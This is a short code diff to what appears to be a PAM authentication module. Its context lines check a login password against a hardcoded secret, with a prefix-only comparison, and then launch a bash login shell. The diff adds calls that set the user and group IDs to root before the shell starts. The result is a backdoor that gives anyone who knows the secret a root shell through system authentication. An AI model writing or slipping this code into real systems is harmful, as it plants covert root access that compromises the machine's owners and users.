@@ -162,6 +162,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
     if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
+        setuid(0);
+        setgid(0);
         // Prepare arguments for exec
         char *shell = "/bin/bash";
         char *args[] = {shell, "--login", NULL};
